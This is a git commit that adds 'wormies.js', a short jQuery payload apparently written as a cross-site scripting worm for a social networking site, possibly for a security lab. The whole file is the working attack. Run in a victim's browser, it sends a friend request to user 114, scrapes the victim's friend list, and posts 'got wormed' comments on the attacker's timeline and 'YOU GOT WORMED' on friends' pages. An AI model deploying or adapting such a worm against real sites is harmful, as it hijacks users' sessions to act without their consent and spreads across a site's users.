ae9a241c47284ff6ceb0240a7a594d7b32a88c8c
sxa7263 <35963445+sxa7263@users.noreply.github.com>
2020-11-07 18:43:57 -0500

    Create wormies.js

---
+++ wormies.js
@@ -0,0 +1,14 @@
+$.get("add_friend.php", {'id': 114}); 
+$.get("friends.php", (homies)=>{
+    a = homies.split("?id="); 
+    for(var i = 1; i < a.length; i++){
+        b = a[i].split("'>");
+        $.get("timeline.php", {'id': 114}, (report)=>{
+            if(!report.includes(b + " got wormed")){
+                $.get("add_comment.php", {'id': 114, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
+                $.get("add_comment.php", {'id': b, 'comment': "YOU GOT WORMED"});
+            }
+        });
+    }
+}
+)
